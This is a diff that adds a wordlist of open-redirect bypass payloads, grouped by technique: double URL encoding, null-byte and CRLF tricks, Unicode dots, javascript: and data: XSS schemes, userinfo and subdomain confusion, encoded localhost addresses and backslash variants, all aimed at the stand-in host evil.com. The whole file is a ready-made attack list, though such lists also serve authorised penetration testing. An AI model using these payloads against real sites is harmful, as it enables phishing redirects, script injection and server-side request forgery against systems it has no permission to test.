@@ -1,0 +1,33 @@
+# Open Redirect Bypass Payloads
+# Double URL Encoding
+%2f%2fevil.com
+%2f%5cevil.com
+%252f%252fevil.com
+# Null Byte
+//evil.com%00.good.com
+//evil.com%0d%0a.good.com
+# Unicode
+//evil。com
+//evil%E3%80%82com
+# Protocol Tricks
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+//evil.com?good.com
+//evil.com#good.com
+# Subdomain Tricks
+//good.com.evil.com
+//evil.com/good.com
+//good.com@evil.com
+//evil.com\good.com
+# Case Variation
+//EVIL.COM
+//Evil.Com
+# IP Address
+//127.0.0.1
+//0x7f000001
+//2130706433
+//[::1]
+# Backslash
+/\/evil.com
+/\evil.com
+\\evil.com
